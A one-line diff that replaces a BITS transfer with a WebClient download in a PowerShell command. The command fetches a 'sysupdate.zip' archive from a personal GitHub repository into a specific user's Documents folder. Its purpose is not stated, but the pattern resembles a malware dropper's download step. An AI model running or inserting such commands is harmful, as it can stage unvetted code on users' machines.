@@ -1,1 +1,1 @@
-powershell -command "Start-BitsTransfer -Source 'https://github.com/0xHumanDev/oxhuman/raw/main/sysupdate.zip' -Destination 'C:\Users\HP ZBook\Documents\sysupdate.zip'"
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/0xHumanDev/oxhuman/raw/main/sysupdate.zip', 'C:\Users\HP ZBook\Documents\sysupdate.zip')"
